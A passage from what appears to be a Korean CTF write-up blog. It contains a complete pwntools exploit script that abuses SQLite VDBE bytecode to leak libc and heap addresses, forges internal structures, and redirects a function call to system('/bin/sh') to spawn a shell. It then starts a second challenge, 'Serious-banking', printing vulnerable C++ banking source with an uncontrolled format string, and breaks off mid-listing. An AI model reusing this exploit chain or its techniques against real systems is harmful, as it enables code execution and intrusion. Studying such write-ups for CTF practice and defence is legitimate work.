</span></span><span style="display:flex;"><span>OPFLG_OUT2       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span><span style="color:#75715e">#  /* out2:  P2 is an output */</span>
</span></span><span style="display:flex;"><span>OPFLG_OUT3       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span><span style="color:#75715e">#  /* out3:  P3 is an output */</span>
</span></span><span style="display:flex;"><span>OPFLG_NCYCLE     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40</span><span style="color:#75715e">#  /* ncycle:Cycles count against P1 */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./chal&#39;</span>)
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./chal&#39;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">prepare</span>(idx, stmt):
</span></span><span style="display:flex;"><span>  sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choice: &#39;</span>,str(<span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>  sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;? &#39;</span>,str(idx))
</span></span><span style="display:flex;"><span>  sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;line:&#39;</span>,stmt)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">compile</span>(opcode, p1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, p2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> , p3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ,p4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ,p4_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, p5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p8(opcode)
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p8(p4_type)
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p16(p5)
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p32(p1)
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p32(p2)
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p32(p3)
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> p64(p4)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modify_opcode</span>(idx, vmcode):
</span></span><span style="display:flex;"><span>  sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choice: &#39;</span>,str(<span style="color:#ae81ff">5</span>))
</span></span><span style="display:flex;"><span>  sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;? &#39;</span>,str(idx))
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;up to &#39;</span>)
</span></span><span style="display:flex;"><span>  c <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>  sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;? &#39;</span>,str(len(vmcode)))
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">assert</span> c<span style="color:#f92672">%</span><span style="color:#ae81ff">0x18</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>send(vmcode)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_q</span>(idx):
</span></span><span style="display:flex;"><span>  sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Choice: &#39;</span>,str(<span style="color:#ae81ff">2</span>))
</span></span><span style="display:flex;"><span>  sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;? &#39;</span>,str(idx))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;SELECT &#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x20</span>):
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;(SELECT </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">),&#39;</span><span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>prepare(<span style="color:#ae81ff">1</span>,payload)
</span></span><span style="display:flex;"><span>pc <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> compile(OP_Init, <span style="color:#ae81ff">0</span>, pc) <span style="color:#75715e"># jmp to pc</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_Integer,<span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_IntCopy, (<span style="color:#f92672">-</span><span style="color:#ae81ff">146</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_ResultRow, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>) <span style="color:#75715e"># p2 = col count</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_Halt)
</span></span><span style="display:flex;"><span>modify_opcode(<span style="color:#ae81ff">1</span>, payload)
</span></span><span style="display:flex;"><span>exec_q(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21ace0</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(hex(libc_base))
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">OP_SCopy         = 81# /* synopsis: r[P2]=r[P1]                      */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">OP_IntCopy       = 82# /* synopsis: r[P2]=r[P1]                      */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> compile(OP_Init, <span style="color:#ae81ff">0</span>, pc) <span style="color:#75715e"># jmp to pc</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_Integer,<span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_IntCopy, (<span style="color:#f92672">-</span><span style="color:#ae81ff">0xb8</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_ResultRow, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>) <span style="color:#75715e"># p2 = col count</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_Halt)
</span></span><span style="display:flex;"><span>modify_opcode(<span style="color:#ae81ff">1</span>, payload)
</span></span><span style="display:flex;"><span>exec_q(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">0x14578</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(hex(heap_base))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mem_start <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x16e28</span>
</span></span><span style="display:flex;"><span>payload_start <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x36b8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># sqlite3_context</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#75715e"># scopy 0x18</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(mem_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># Mem * pOut &lt;- Mem[0] address, p3 must be 0</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(payload_start<span style="color:#f92672">+</span><span style="color:#ae81ff">0x38</span>) <span style="color:#75715e"># FuncDef *pFunc</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(payload_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#75715e"># /bin/sh</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span> <span style="color:#75715e"># argc = 1</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># argv *</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># FuncDef</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000009097f</span>) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x360</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system<span style="color:#f92672">-</span><span style="color:#ae81ff">0x46e</span>) <span style="color:#75715e"># do_system + 2</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x000000000009097f : mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x360]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>hexp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> payload:
</span></span><span style="display:flex;"><span>  hexp <span style="color:#f92672">+=</span> hex(i)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>prepare(<span style="color:#ae81ff">2</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SELECT x&#39;</span><span style="color:#e6db74">{</span>hexp<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> compile(OP_Init, <span style="color:#ae81ff">0</span>, pc) <span style="color:#75715e"># jmp to pc</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_PureFunc, p4 <span style="color:#f92672">=</span> payload_start, p3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_Halt)
</span></span><span style="display:flex;"><span>modify_opcode(<span style="color:#ae81ff">1</span>, payload)
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>exec_q(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="serious-banking">Serious-banking<a hidden class="anchor" aria-hidden="true" href="#serious-banking">#</a></h1>
<p>대회 기간에 풀었던 문제이다.</p>
<h2 id="analysis-1">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-1">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstring&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;thread&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdio&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Account</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> id;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> active;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> name;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> balance;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">submit_support_ticket</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> _name, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> _content) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// stub
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> separator;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> debug_log;
</span></span><span style="display:flex;"><span>Account<span style="color:#f92672">*</span> accounts;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> id_counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>size_t account_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">interface</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(true) {
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Welcome to the ShakyVault Bank Interface</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        printf(separator);
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;1) Create new Account</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;2) Show an Account</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;3) Create a Transaction</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;4) Deactivate an Account</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;5) Create a support ticket</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;6) Exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> selection <span style="color:#f92672">=</span> fgetc(stdin) <span style="color:#f92672">-</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(<span style="color:#e6db74">&#39;0&#39;</span>);
</span></span><span style="display:flex;"><span>        fgetc(stdin);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (selection) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (account_count <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">255</span>) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;We&#39;ve unfortunately run out of accounts. Please try again later.&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Account Name: &#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> account_name <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">80</span>];
</span></span><span style="display:flex;"><span>                std<span style="color:#f92672">::</span>cin.getline(account_name, <span style="color:#ae81ff">80</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">80</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (account_name[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>) {
</span></span><span style="display:flex;"><span>                        account_name[i] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                account_name[<span style="color:#ae81ff">79</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                accounts[account_count].id <span style="color:#f92672">=</span> id_counter<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>                accounts[account_count].active <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>                accounts[account_count].name <span style="color:#f92672">=</span> account_name;
</span></span><span style="display:flex;"><span>                accounts[account_count].balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">35</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Account created. Your id is %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, accounts[account_count<span style="color:#f92672">++</span>].id);
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;We have granted you a $35 starting bonus.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Which id do you want to read? &#34;</span>);
</span></span><span style="display:flex;"><span>                size_t number;
</span></span><span style="display:flex;"><span>                std<span style="color:#f92672">::</span>cin <span style="color:#f92672">&gt;&gt;</span> number;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (std<span style="color:#f92672">::</span>cin.fail()) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;Invalid Input.&#34;</span>);
</span></span><span style="display:flex;"><span>                    exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                fgetc(stdin);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (number <span style="color:#f92672">&gt;=</span> account_count) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;That account does not exist.&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> Account acc <span style="color:#f92672">=</span> accounts[number];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Id: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, acc.id);
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Name: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, acc.name);
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Active: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, acc.active <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;false&#34;</span>);
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Balance: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, acc.balance);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Which account do you want to transfer from? &#34;</span>);
</span></span><span style="display:flex;"><span>                size_t id_from;
</span></span><span style="display:flex;"><span>                std<span style="color:#f92672">::</span>cin <span style="color:#f92672">&gt;&gt;</span> id_from;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (std<span style="color:#f92672">::</span>cin.fail()) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;Invalid Input.&#34;</span>);
</span></span><span style="display:flex;"><span>                    exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                fgetc(stdin);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Which account do you want to transfer to? &#34;</span>);
</span></span><span style="display:flex;"><span>                size_t id_to;
</span></span><span style="display:flex;"><span>                std<span style="color:#f92672">::</span>cin <span style="color:#f92672">&gt;&gt;</span> id_to;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (std<span style="color:#f92672">::</span>cin.fail()) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;Invalid Input.&#34;</span>);
</span></span><span style="display:flex;"><span>                    exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                fgetc(stdin);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (id_from <span style="color:#f92672">&gt;=</span> account_count <span style="color:#f92672">||</span> id_to <span style="color:#f92672">&gt;=</span> account_count) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;Invalid account id</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;How much money do you want to transfer? &#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">uint64_t</span> amount;
</span></span><span style="display:flex;"><span>                std<span style="color:#f92672">::</span>cin <span style="color:#f92672">&gt;&gt;</span> amount;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (std<span style="color:#f92672">::</span>cin.fail()) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;Invalid Input.&#34;</span>);
</span></span><span style="display:flex;"><span>                    exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                fgetc(stdin);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> Account from <span style="color:#f92672">=</span> accounts[id_from];
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> Account to <span style="color:#f92672">=</span> accounts[id_to];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (from.balance <span style="color:#f92672">&lt;</span> amount) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;You don&#39;t have enough money for that.&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>from.active <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>to.active) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;That account is not active.&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                accounts[from.id].balance <span style="color:#f92672">-=</span> amount;
</span></span><span style="display:flex;"><span>                accounts[to.id].balance <span style="color:#f92672">+=</span> amount;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Transaction created!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Which account do you want to disable? &#34;</span>);
</span></span><span style="display:flex;"><span>                size_t number;
</span></span><span style="display:flex;"><span>                std<span style="color:#f92672">::</span>cin <span style="color:#f92672">&gt;&gt;</span> number;
